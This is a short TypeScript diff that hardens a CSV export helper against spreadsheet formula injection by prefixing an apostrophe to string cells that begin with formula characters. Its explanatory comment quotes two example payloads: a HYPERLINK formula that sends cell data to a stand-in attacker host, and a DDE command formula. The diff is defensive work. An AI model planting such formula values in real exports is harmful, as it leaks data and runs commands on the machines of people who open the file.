@@ -87,8 +87,22 @@ function fmtTokens(n: number): string {
   return n.toLocaleString('en-US')
 }
 
+/**
+ * Escape one CSV cell.
+ *
+ * Beyond the usual quote/comma handling this neutralises SPREADSHEET FORMULA
+ * INJECTION: a cell whose text starts with = + - @ (or a tab/CR) is evaluated as
+ * a formula by Excel/Sheets when the export is opened, so a visitor who picked a
+ * name like `=HYPERLINK("https://evil.tld?d="&A1,"Report")` or
+ * `=cmd|'/C calc'!A0` would otherwise get code execution on the admin's machine.
+ * A leading apostrophe forces the cell to text.
+ *
+ * Only STRING cells are guarded, so numeric columns keep working (a negative
+ * number is not an injection attempt).
+ */
 function csvEscape(v: string | number): string {
-  const s = String(v)
+  const raw = String(v)
+  const s = typeof v === 'string' && /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw
   return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
 }
 
